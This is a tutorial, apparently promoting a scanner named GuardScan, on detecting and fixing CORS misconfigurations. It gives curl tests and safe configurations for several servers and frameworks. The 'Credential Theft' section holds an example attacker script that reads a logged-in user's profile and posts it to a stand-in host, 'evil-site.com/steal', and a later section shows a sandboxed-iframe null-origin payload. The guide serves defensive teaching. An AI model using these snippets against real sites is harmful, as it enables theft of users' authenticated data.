---
title: "CORS Misconfiguration: How to Check and Fix It"
date: 2026-03-07
draft: false
tags: ["cors", "security", "tutorial", "guardscan"]
categories: ["Security Guides"]
summary: "CORS misconfigurations are one of the most common web security flaws — and they can let any website steal your users' data. Here's how to find and fix them."
ShowToc: true
---

## Your API Might Be Leaking Data Right Now

Picture this: your API returns sensitive user data — account details, billing info, private messages. You've got authentication in place, HTTPS everywhere, and a solid firewall. But your CORS configuration has one line wrong, and now **any website on the internet** can make authenticated requests to your API and read the responses.

The user just has to visit a malicious page while logged into your app. No phishing. No malware. Just a misconfigured header.

CORS misconfigurations are one of the most common security findings in web application pentests, and they're almost always introduced by developers trying to "just make it work" during development. The fix that gets things running locally becomes the vulnerability that leaks data in production.

## What Is CORS?

To understand CORS, you first need to understand the **same-origin policy** — the foundational security rule of the web.

Browsers enforce a simple rule: JavaScript on `site-a.com` cannot read responses from `site-b.com`. This prevents a malicious page from silently fetching your bank account page and reading your balance.

An **origin** is defined by three things: the scheme (`https`), the host (`example.com`), and the port (`443`). If any of those differ, the browser considers it a different origin.

**CORS** (Cross-Origin Resource Sharing) is the mechanism that relaxes this restriction. It lets servers explicitly declare which other origins are allowed to read their responses. The server does this by setting the `Access-Control-Allow-Origin` response header.

Here's how it works:

1. Your browser sends a request to `api.example.com` from JavaScript running on `app.example.com`
2. The browser includes an `Origin: https://app.example.com` header
3. The server responds with `Access-Control-Allow-Origin: https://app.example.com`
4. The browser sees the origin matches and allows JavaScript to read the response

If the server doesn't include the right `Access-Control-Allow-Origin` header, the browser blocks JavaScript from reading the response. The request still goes through — CORS is not a firewall — but the browser withholds the response data.

For requests that might modify data (PUT, DELETE, or requests with custom headers), the browser sends a **preflight request** first — an OPTIONS request asking the server what's allowed before sending the real request.

## Why CORS Misconfigurations Are Dangerous

When CORS is misconfigured, the same-origin policy stops protecting your users. Here's what an attacker can do:

### Credential Theft

If your API reflects any origin and allows credentials, an attacker can create a page that makes authenticated requests to your API. When a logged-in user visits the attacker's page, their browser sends cookies automatically, and the attacker's JavaScript can read the full response.

```javascript
// On attacker's page: evil-site.com
fetch('https://your-api.com/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Attacker now has the user's profile data
  fetch('https://evil-site.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

This works silently. The user sees nothing.

### Data Exfiltration

Internal APIs that are "only used by our frontend" are especially vulnerable. Developers assume the API isn't public because there's no documentation for it. But if CORS is misconfigured, any website can call those endpoints just like the frontend does.

### Token Harvesting

If your API returns access tokens, API keys, or session data in responses, a CORS misconfiguration lets attackers read those tokens from any page the user visits.

## The Quick Way: Check With an Online Scanner

Manually testing CORS policies requires multiple `curl` commands with different origin headers, and you need to know which combinations are dangerous. It's easy to miss something.

[GuardScan](https://guardscan.dev) checks for **six common CORS misconfigurations** in a single scan:

1. **Reflected Origin** — the server echoes back whatever `Origin` you send
2. **Wildcard Origin** (`*`) — the server allows every origin
3. **Credentials with Wildcard** — `Access-Control-Allow-Credentials: true` combined with `*`
4. **Credentials with Reflected Origin** — the most dangerous combo, allows authenticated cross-origin reads
5. **Null Origin Allowed** — the server trusts `Origin: null`, which can be spoofed from sandboxed iframes and local files
6. **Dangerous HTTP Methods** — the server allows methods like `PUT`, `DELETE`, or `PATCH` from any origin

Enter your URL, and you'll see which of these issues affect your site — with explanations of the risk level for each one. Free, no signup required.

## How to Check CORS Manually

If you prefer the command line, here's how to test for the most common issues using `curl`.

### Test for Reflected Origin

Send a request with a fake origin and see if the server reflects it back:

```bash
curl -s -D - -o /dev/null \
  -H "Origin: https://evil.com" \
  https://your-site.com/api/endpoint
```

Look at the response headers. If you see:

```
Access-Control-Allow-Origin: https://evil.com
```

The server is reflecting whatever origin you send. That's a misconfiguration.

### Test for Wildcard

```bash
curl -s -D - -o /dev/null https://your-site.com/api/endpoint
```

If the response includes:

```
Access-Control-Allow-Origin: *
```

The server is allowing every origin. This is fine for truly public resources (CDNs, public APIs with no auth), but dangerous for anything behind authentication.

### Test for Credentials + Reflected Origin

```bash
curl -s -D - -o /dev/null \
  -H "Origin: https://evil.com" \
  https://your-site.com/api/endpoint
```

If you see both of these in the response:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

This is the worst-case scenario. Any website can make authenticated requests and read the responses.

### Test for Null Origin

```bash
curl -s -D - -o /dev/null \
  -H "Origin: null" \
  https://your-site.com/api/endpoint
```

If the response includes:

```
Access-Control-Allow-Origin: null
```

The server trusts the null origin. Attackers can send `Origin: null` from sandboxed iframes:

```html
<iframe sandbox="allow-scripts" src="data:text/html,<script>
fetch('https://your-site.com/api/endpoint')
.then(r=>r.text()).then(d=>document.title=d)
</script>"></iframe>
```

### Test for Allowed Methods

```bash
curl -s -D - -o /dev/null \
  -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  https://your-site.com/api/endpoint
```

Check the `Access-Control-Allow-Methods` header. If it includes `PUT`, `DELETE`, or `PATCH` and the origin policy is permissive, that's a problem.

## The 6 Most Common CORS Misconfigurations

### 1. Reflecting the Origin Header

The server takes the `Origin` header from the request and echoes it back in `Access-Control-Allow-Origin`. This effectively allows every origin while looking like it's doing origin validation.

**Why it happens:** Developers use this pattern to "support multiple origins" without maintaining a whitelist.

```python
# BAD: don't do this
response['Access-Control-Allow-Origin'] = request.headers.get('Origin')
```

**The risk:** Any website can read your API responses. If credentials are also allowed, it's a full authentication bypass for cross-origin reads.

### 2. Wildcard `*` Origin

```
Access-Control-Allow-Origin: *
```

The server allows every origin. Browsers won't send credentials with wildcard CORS (there's a built-in safeguard), but this still exposes any data in unauthenticated responses.

**When it's OK:** Public APIs, CDN resources, open data endpoints — anything that's intentionally public and doesn't use cookies or auth headers.

**When it's not OK:** Internal APIs, admin endpoints, or any route that returns data you wouldn't want on a billboard.

### 3. Allowing Credentials with Wildcard

Some server frameworks will let you set both:

```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

Modern browsers block this combination (it's explicitly forbidden in the spec), but misconfigured reverse proxies, older browsers, or non-browser clients might not enforce this. It signals a fundamental misunderstanding of CORS in the server config.

### 4. Allowing Credentials with Reflected Origin

This is the most dangerous configuration:

```
Access-Control-Allow-Origin: https://whatever-the-attacker-sends.com
Access-Control-Allow-Credentials: true
```

The server reflects any origin AND tells the browser to include credentials. This means:

- The browser sends cookies with the request
- The browser allows JavaScript to read the response
- The attacker gets authenticated data

This is functionally equivalent to having no same-origin policy at all for your API.

### 5. Allowing the Null Origin

```
Access-Control-Allow-Origin: null
```

The `null` origin is sent by:

- Pages loaded from `file://` URLs
- Sandboxed iframes (using the `sandbox` attribute)
- Redirected cross-origin requests

Attackers can trivially generate requests with `Origin: null` using sandboxed iframes. If your server trusts it, they can bypass your CORS policy entirely.

**Why it happens:** Developers add `null` to their whitelist because they see it during local development (files opened directly in the browser send `Origin: null`).

### 6. Exposing Dangerous HTTP Methods

```
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
```

Allowing all HTTP methods from cross-origin requests means an attacker's page could potentially modify or delete data through your API — not just read it.

**The fix:** Only allow the methods your cross-origin clients actually need. Most frontends only need `GET` and `POST`.

## How to Fix CORS

The core principle: **explicitly whitelist only the origins that need access**. Never reflect, never wildcard (unless the resource is truly public), and be deliberate about credentials.

### Nginx

```nginx
# Define allowed origins
map $http_origin $cors_origin {
    default "";
    "https://app.example.com" "$http_origin";
    "https://staging.example.com" "$http_origin";
}

server {
    location /api/ {
        # Only set CORS headers if the origin is allowed
        if ($cors_origin != "") {
            add_header Access-Control-Allow-Origin $cors_origin always;
            add_header Access-Control-Allow-Methods "GET, POST, OPTIONS" always;
            add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
            add_header Access-Control-Allow-Credentials "true" always;
            add_header Access-Control-Max-Age 86400 always;
        }

        # Handle preflight
        if ($request_method = OPTIONS) {
            return 204;
        }
    }
}
```

**Key points:** The `map` block creates a whitelist. If the origin isn't in the list, `$cors_origin` is empty and no CORS headers are sent at all — the browser's same-origin policy blocks the request.

### Apache

```apache
# In your virtual host or .htaccess
SetEnvIf Origin "^https://(app|staging)\.example\.com$" CORS_ORIGIN=$0

Header always set Access-Control-Allow-Origin %{CORS_ORIGIN}e env=CORS_ORIGIN
Header always set Access-Control-Allow-Methods "GET, POST, OPTIONS" env=CORS_ORIGIN
Header always set Access-Control-Allow-Headers "Content-Type, Authorization" env=CORS_ORIGIN
Header always set Access-Control-Allow-Credentials "true" env=CORS_ORIGIN
Header always set Access-Control-Max-Age "86400" env=CORS_ORIGIN

# Handle preflight
RewriteEngine On
RewriteCond %{REQUEST_METHOD} OPTIONS
RewriteRule ^(.*)$ $1 [R=204,L]
```

**Key points:** The `SetEnvIf` directive only sets the `CORS_ORIGIN` variable if the origin matches the regex. The `env=CORS_ORIGIN` condition on each `Header` directive means headers are only sent when the origin is whitelisted.

### Express.js / Node

```javascript
const cors = require('cors');

const allowedOrigins = [
  'https://app.example.com',
  'https://staging.example.com'
];

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (mobile apps, curl, etc.)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      return callback(null, origin);
    }

    return callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400
}));
```

**Key points:** The `origin` function checks against a whitelist. Only whitelisted origins get the `Access-Control-Allow-Origin` header. The `credentials: true` option enables cookies, which is safe because we're not using a wildcard or reflecting arbitrary origins.

### Django / Python

```python
# settings.py
INSTALLED_APPS = [
    # ...
    'corsheaders',
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',
    # ... other middleware (CorsMiddleware should be high in the list)
]

# Whitelist specific origins — don't use CORS_ALLOW_ALL_ORIGINS
CORS_ALLOWED_ORIGINS = [
    'https://app.example.com',
    'https://staging.example.com',
]

CORS_ALLOW_CREDENTIALS = True

CORS_ALLOW_METHODS = [
    'GET',
    'POST',
    'OPTIONS',
]

CORS_ALLOW_HEADERS = [
    'content-type',
    'authorization',
]
```

**Key points:** Use `django-cors-headers` and set `CORS_ALLOWED_ORIGINS` — never set `CORS_ALLOW_ALL_ORIGINS = True` in production. The library handles preflight responses and header management automatically.

### Cloudflare Workers

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://staging.example.com'
]);

export default {
  async fetch(request) {
    const origin = request.headers.get('Origin');

    // Handle preflight
    if (request.method === 'OPTIONS') {
      if (origin && ALLOWED_ORIGINS.has(origin)) {
        return new Response(null, {
          status: 204,
          headers: {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Max-Age': '86400',
          }
        });
      }
      return new Response(null, { status: 403 });
    }

    // Fetch the actual response
    const response = await fetch(request);
    const newResponse = new Response(response.body, response);

    if (origin && ALLOWED_ORIGINS.has(origin)) {
      newResponse.headers.set('Access-Control-Allow-Origin', origin);
      newResponse.headers.set('Access-Control-Allow-Credentials', 'true');
    }

    return newResponse;
  }
};
```

**Key points:** The `Set` lookup is O(1). Non-whitelisted origins get no CORS headers at all. Preflight requests from unknown origins get a 403.

## CORS Best Practices

**Maintain an explicit whitelist.** Never reflect the `Origin` header. Never use `*` for anything that requires authentication. List your allowed origins and check against them.

**Be strict with methods.** Only allow the HTTP methods your cross-origin clients actually use. There's no reason to allow `DELETE` from a cross-origin request if your frontend only does `GET` and `POST`.

**Limit exposed headers.** Use `Access-Control-Expose-Headers` to control which response headers JavaScript can read. Don't expose more than necessary.

**Set `Access-Control-Max-Age`.** Preflight caching reduces latency. A value of `86400` (24 hours) is common. This means the browser won't send a preflight OPTIONS request for every single API call.

**Don't trust `null`.** Remove `null` from any origin whitelist. If you need it for local development, use a local dev server that serves over `http://localhost` instead of opening HTML files directly.

**Audit regularly.** CORS configs tend to get more permissive over time as developers add origins to "fix" issues. Review your whitelist quarterly and remove origins that no longer need access.

**Don't confuse CORS with authorization.** CORS controls which origins can read responses — it doesn't replace authentication or authorization. Even with perfect CORS, you still need to validate tokens, check permissions, and authenticate every request server-side.

## Scan Your Site Now

CORS misconfigurations are invisible to your users but trivial for attackers to exploit. You won't get an error message or a warning — your API will work perfectly for everyone, including the people who shouldn't have access.

[Scan your site with GuardScan](https://guardscan.dev) to check for all six CORS issues in one click. It's free, takes under a second, and checks your headers, SSL, DNS, cookies, and more while it's at it.
